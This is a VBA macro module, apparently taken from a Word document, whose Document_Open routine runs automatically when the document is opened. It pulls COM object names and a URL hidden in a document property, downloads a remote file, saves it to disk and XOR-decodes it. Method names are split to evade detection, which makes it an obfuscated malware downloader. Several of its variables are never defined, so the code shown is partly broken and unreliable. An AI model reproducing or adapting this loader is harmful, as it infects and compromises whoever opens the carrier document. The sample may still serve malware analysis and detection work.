Attribute VB_Name = "ThisDocument"

Sub Document_Open()
    tt = ThisDocument.BuiltInDocumentProperties("Content status").Value
    AlertN = Split(tt, "HUBBLE")
    ClientProgID = AlertN(0)
    Set CofeeShop = CreateObject(ClientProgID)
    Set SubProperty = CreateObject(AlertN(1))
    Set avatar = CreateObject(AlertN(2))
    Set VEAM = avatar.Environment(AlertN(3))
    CallByName CofeeShop, "op" + "en", VbMethod, "GET", AlertN(4), False
    JRunBee_PokerFace = CallByName(CofeeShop, "re" + "sponseBody", VbGet)
    SubProperty.Type = 1
    SubProperty.Write JRunBee_PokerFace
    CallByName SubProperty, "sav" + "eToFile", VbMethod, VEAM(AlertN(5)), 2
    Open src For Binary As #1
    Get #1, , buf()
    Close #1
    For i = 0 To UBound(buf)
        buf(i) = Chibis(buf(i), key(i Mod keyLen))
    Next
    Open dst For Binary As #2
    Put #2, , buf()
    Close #2
End Sub

Public Function Chibis(a, b)
    Chibis = (a Or b) And (Not (a And b))
End Function
